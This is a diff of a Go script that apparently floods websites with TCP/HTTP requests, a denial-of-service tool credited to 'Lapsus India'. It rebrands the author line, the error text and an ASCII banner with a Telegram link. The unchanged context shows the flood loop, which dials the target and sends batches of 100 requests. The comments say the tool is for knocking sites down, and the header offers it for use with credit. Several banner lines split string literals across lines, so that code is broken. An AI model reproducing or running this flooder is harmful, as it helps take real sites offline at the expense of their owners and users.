@@ -1,6 +1,6 @@
 /*
 Coded by Lapsus India
-Please fking code ur script by ur self
+written by team Lapsus, use with credit 
 */
 package main
 
@@ -191,7 +191,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Maybe ur ip got blocked or website got down") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("Fucking The Website Please Check It") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -213,17 +213,15 @@ func main() {
     fmt.Println("                                                                                         ")
     fmt.Println("   _______________                                                           _______________ ")
     fmt.Println("  |               |                                                         |               |")
-    fmt.Println("  | Jai Shree Ram |  =====================================================  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  | ================================================= |  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  | |                                               | |  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  | |       RRRR   OOO  OOO  TTTTT
-  R   R O   O O   O   T  
-  RRRR  O   O O   O   T  
-  R  R   OOO   OOO    T  
-     | |  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  | |                                               | |  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  | ================================================= |  | Jai Shree Ram |")
-    fmt.Println("  | Jai Shree Ram |  =====================================================  | Jai Shree Ram |")
+    fmt.Println("  | lapsus india  |  =====================================================  | lapsus india  |")
+    fmt.Println("  | lapsus india  |  | ================================================= |  | lapsus india  |")
+    fmt.Println("  | lapsus india  |  | |                                               | |  | lapsus india  |")
+    fmt.Println("  | lapsus india  |  | |           RRRR   OOO  OOO  TTTTT
+  
+     | |  |        | lapsus india  |")
+    fmt.Println("  | lapsus india  |  | |                                               | |  | lapsus india  |")
+    fmt.Println("  | lapsus india  |  | ================================================= |  | lapsus india  |")
+    fmt.Println("  | lapsus india  |  =====================================================  | lapsus india  |")
     fmt.Println("  |_______________|    https://t.me/teamlapsusindia         ||  COD3D BY LAPSUS  ||  |_______________|")
     fmt.Println("                                                    =====================")
     fmt.Println("                                                                                         ")
